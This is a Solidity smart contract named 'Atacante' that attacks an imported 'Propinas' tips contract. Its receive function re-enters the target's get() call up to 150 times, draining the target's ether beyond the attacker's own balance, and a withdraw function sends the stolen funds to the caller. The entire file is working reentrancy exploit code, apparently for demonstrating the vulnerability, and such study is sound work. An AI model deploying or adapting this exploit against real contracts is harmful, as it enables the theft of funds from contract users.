pragma solidity 0.6.7;

import "./Propinas.sol";

contract Atacante {
  Propinas public propinas;

  uint8 public ciclos;
  event Collected(uint _value);
  event Transfer(address indexed _from, uint _value, uint ciclos);

  constructor(address payable _propinas) public payable {
    propinas = Propinas(_propinas);
  }

  function collectTips() external {
    ciclos = 0;
    propinas.get();
  }

  function withdraw() public payable {
    emit Transfer(msg.sender, address(this).balance, ciclos);
    msg.sender.transfer(address(this).balance);
  }

  receive () external payable {
    ciclos += 1;
    uint AmountOfEther = address(propinas).balance;

    uint myBalanceInTarget = propinas.getBalanceOf(address(this));
    if (ciclos < 150 && AmountOfEther > myBalanceInTarget) {
      propinas.get();
    }
    emit Collected(address(this).balance);
  }

  fallback() external payable {
    require(false, 'fallback');
  }
}